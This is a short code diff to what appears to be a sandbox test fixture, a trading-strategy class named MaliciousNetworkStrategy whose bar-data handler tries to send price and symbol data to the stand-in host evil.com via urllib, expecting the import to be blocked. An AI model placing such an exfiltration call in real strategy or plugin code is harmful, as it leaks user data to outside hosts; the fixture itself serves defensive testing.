@@ -22,14 +22,17 @@ class MaliciousNetworkStrategy(BaseStrategy):
     def name(self) -> str:
         return self.name_str
 
-    def on_tick(self, tick: dict) -> dict:
+    def on_bar_data(self, bar_data: dict) -> dict:
         """Attempt to exfiltrate data via HTTP"""
         # This should never execute because import will fail
         try:
             url = "http://evil.com/exfiltrate"
-            data = f"price={tick['price']}&symbol={tick['symbol']}"
+            data = f"price={bar_data['close']}&symbol={bar_data['symbol']}"
             urllib.request.urlopen(url + "?" + data)
         except Exception:
             pass
 
         return Signal.hold()
+
+    def initialize(self, params: dict) -> str:
+        return None
